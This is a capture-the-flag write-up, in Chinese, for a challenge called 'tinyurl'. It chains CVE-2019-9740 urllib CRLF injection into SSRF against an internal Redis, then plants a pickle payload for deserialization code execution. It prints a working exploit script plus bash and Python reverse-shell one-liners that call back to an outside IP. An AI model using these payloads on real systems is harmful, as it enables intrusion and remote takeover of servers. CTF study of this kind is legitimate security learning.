## tinyurl
首先先查到 urllib 的漏洞 CVE-2016-5699 並查看到相關文章，但最後發現無法使用猜測被修復了，查了一下漏洞對應的 python 版本號也是如此。因此只好繼續查資料...。
之後發現今年也有一個 urllib 的漏洞，對應 CVE-2019-9740 Python urllib CRLF injection vulnerability，因此先做嘗試。
我先使用 `nc -vlk 1234` 在本機建立一個 port 去接 return header，結果如下：
```
url = "http://140.113.209.28:12345/?q=a HTTP\x2f1.1\x0d\x0arce: here\x0d\x0aHeader2\x3a"
```
```bash
yuan@yuan-All-Series:~$ nc -vl 12345
Listening on [0.0.0.0] (family 0, port 12345)
Connection from 172.18.0.3 43174 received!
GET /?q=a HTTP/1.1
rce: here
Header2: HTTP/1.1
Accept-Encoding: identity
Host: 140.113.209.28:12345
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36
Connection: close
```
發現 header 被我更改了！！！
之後就可以藉由 CVE-2019-9740 的說明 (https://bugs.python.org/issue36276) 去攻擊 redis ....
但要攻擊 redis，首先要知道 redis 的 ip 位置，這讓我想到之前 AIS3-2019 有解到一題可以透過檔案去取得本地的 ip 得方法 (d1v1n6 d33p3r)，拿來使用試試
先用 exec 進入 redis 主機
```
root@411df3d9b675:/data# cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/30 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.2
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/30 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.2
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
```
可以看到 redis ip 為 172.18.0.2，就可以嘗試做攻擊
```
url = "http://172.18.0.2:6379/?q=a HTTP\x2f1.1\x0d\x0aSET foo bar\x0d\x0aSAVE\x0d\x0aHeader2\x3a"
```
```
root@411df3d9b675:/data# redis-cli monitor
OK
1575354927.114477 [0 172.18.0.3:41290] "SETEX" "session:b26bf330-be21-435c-95df-62fa7425419a" "2678400" "\x80\x03}q\x00X\n\x00\x00\x00_permanentq\x01\x88s."
1575354928.910544 [0 172.18.0.3:41290] "GET" "session:aaaa"
1575354928.911616 [0 172.18.0.3:44374] "SET" "foo" "bar"
1575354928.968113 [0 172.18.0.3:44374] "Host:" "172.18.0.2:6379"
1575354928.970296 [0 172.18.0.3:41290] "SETEX" "session:aaaa" "2678400" "\x80\x03}q\x00X\n\x00\x00\x00_permanentq\x01\x88s."

root@411df3d9b675:/data# redis-cli
127.0.0.1:6379> KEYS foo
1) "foo"
127.0.0.1:6379> GET foo
"bar"
127.0.0.1:6379> 

```
可以看到可以加東西進入 redis 中了，之後看看 redis 有什麼
```
127.0.0.1:6379> KEYS s*
 1) "session:59f2209c-c7e7-45a0-8bf6-0ccc3430415a"
 2) "session:2cfb6ee5-a777-4cd0-8ee2-fe5bca16721c"
 ...
 
127.0.0.1:6379> GET session:59f2209c-c7e7-45a0-8bf6-0ccc3430415a
"\x80\x03}q\x00X\n\x00\x00\x00_permanentq\x01\x88s."
```
可以看到存 session 中的東西是一個序列化得字串，因此就可以去做反序列化攻擊
```python
# coding=utf-8
import requests
import os
import redis
import _pickle as pickle

class A(object):
    def __reduce__(self):
        a = "bash -c 'bash -i >& /dev/tcp/140.113.209.28/1234 0>&1'"
        return (os.system, (a, ))


a = A()
result = pickle.dumps(a)

url = 'http://172.18.0.2:6379/?q=a HTTP\x2f1.1\x0d\x0aSET session:fuck ' + str(
    result)[1:] + '\x0d\x0aSAVE\x0d\x0aHeader2\x3a'
my_params = {'url': url}
b = requests.post('https://127.0.0.1:10163/', my_params, verify=False)
print(b.text)
```
由於 redis 對於 `"` 很敏感，如果使用有較長的 payload 並對 " 前加上跳脫字元得化，redis 會把所有像是 `\x30` 變成 `\\x30`
```
a = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"140.113.209.28\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"
```
`"SET" "session:fuck" "\\x80\\x03....`
而如果使用 `\x34` 代替 `"` ，則會解析成 `4`

`s.connect((4140.113.209.284,1234));`

之後果斷使用以前教的 reverse shell payload
之後嘗試打題目主機，但發現主機的 redis ip 不在 172.18.0.2，推測是 docker 的緣故，畢竟題目主機不知有多少的 container....
改使用 `'http://redis:6379/` 解決他就成功了，之後把連上去那網頁的並換成自己創 session 的就能 reverse shell
